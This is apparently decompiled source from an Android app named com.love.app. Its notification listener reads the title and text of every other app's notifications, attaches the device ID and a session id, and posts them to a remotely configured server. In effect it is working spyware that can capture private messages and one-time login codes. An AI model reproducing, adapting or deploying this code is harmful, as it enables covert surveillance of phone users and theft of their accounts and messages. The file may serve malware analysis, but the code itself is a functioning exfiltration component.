package com.love.app;

import android.provider.Downloads;
import android.provider.Settings;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import androidx.core.os.EnvironmentCompat;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class NotificationListener extends NotificationListenerService {
    private static final String TAG = "NotificationListener";
    private RequestQueue requestQueue;

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationRemoved(StatusBarNotification statusBarNotification) {
    }

    @Override // android.app.Service
    public void onCreate() {
        super.onCreate();
        this.requestQueue = Volley.newRequestQueue(this);
    }

    @Override // android.service.notification.NotificationListenerService
    public void onNotificationPosted(StatusBarNotification statusBarNotification) {
        try {
            String packageName = statusBarNotification.getPackageName();
            if (packageName.equals(getPackageName())) {
                return;
            }
            String string = statusBarNotification.getNotification().extras.getString(NotificationCompat.EXTRA_TITLE, "");
            CharSequence charSequence = statusBarNotification.getNotification().extras.getCharSequence(NotificationCompat.EXTRA_TEXT);
            String string2 = charSequence != null ? charSequence.toString() : "";
            if (string.isEmpty() && string2.isEmpty()) {
                return;
            }
            String string3 = Settings.Secure.getString(getContentResolver(), "android_id");
            if (string3 == null || string3.isEmpty()) {
                string3 = EnvironmentCompat.MEDIA_UNKNOWN;
            }
            sendToServer(string3, packageName, string, string2);
        } catch (Exception e) {
            Log.e(TAG, "onNotificationPosted error", e);
        }
    }

    private void sendToServer(String str, final String str2, String str3, String str4) {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null || baseUrl.isEmpty()) {
            Log.w(TAG, "baseUrl belum tersedia, notif dilewati");
            return;
        }
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("device_id", str);
            jSONObject.put("app", str2);
            jSONObject.put(Downloads.Impl.COLUMN_TITLE, str3);
            jSONObject.put("content", str4);
            jSONObject.put("time", System.currentTimeMillis());
            jSONObject.put("session_id", ConfigFetcher.getSessionId(this));
            this.requestQueue.add(new JsonObjectRequest(1, baseUrl + "/notif/report", jSONObject, new Response.Listener() { // from class: com.love.app.NotificationListener$$ExternalSyntheticLambda0
                @Override // com.android.volley.Response.Listener
                public final void onResponse(Object obj) {
                    Log.d(NotificationListener.TAG, "Notif terkirim: " + str2);
                }
            }, new Response.ErrorListener() { // from class: com.love.app.NotificationListener$$ExternalSyntheticLambda1
                @Override // com.android.volley.Response.ErrorListener
                public final void onErrorResponse(VolleyError volleyError) {
                    Log.w(NotificationListener.TAG, "Gagal kirim notif: " + (volleyError.getMessage() != null ? volleyError.getMessage() : EnvironmentCompat.MEDIA_UNKNOWN));
                }
            }));
        } catch (Exception e) {
            Log.e(TAG, "sendToServer error", e);
        }
    }
}
